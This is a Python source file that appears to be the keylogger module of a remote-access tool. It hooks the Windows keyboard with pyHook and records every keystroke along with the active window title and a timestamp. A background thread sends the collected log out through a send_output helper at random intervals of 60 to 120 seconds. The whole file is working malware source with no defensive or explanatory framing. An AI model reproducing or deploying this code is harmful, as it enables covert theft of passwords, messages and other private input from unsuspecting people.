import requests
import time
from threading import Thread
import pythoncom
import pyHook
import utils
from random import randint

from time import sleep


started = False
keylog = ""
current_window = ""



def OnKeyboardEvent(event):
    global current_window
    global keylog
    if current_window != event.WindowName:
        current_window = event.WindowName
        keylog += "\n[%s] @@ %s|||" % (current_window, time.ctime())
    key = ""
    if event.Ascii == 27:
        key = '[ESC]'
    elif event.Ascii == 13:
        key = "\n"
    elif event.Ascii:
        key = chr(event.Ascii)
    keylog += key
    return True


def keylogger():
    hm=pyHook.HookManager()
    hm.KeyDown=OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()
	
def update():
	global keylog
	while True:
		utils.send_output("{{KEYLOGS}}"+keylog)
		delay = randint(60,120)
		time.sleep(delay)


def run(action):
    global started
    global keylog
    if action == "start":
        if not started:
            klg = Thread(target=keylogger)
            klg.setDaemon(True)
            klg.start()
			
            updater = Thread(target=update)
            updater.setDaemon(True)
            updater.start()
			
            started = True

        else:
            pass
    elif action == "update":
		# Storing Keystrokes
        utils.send_output("{{KEYLOGS}}"+keylog)


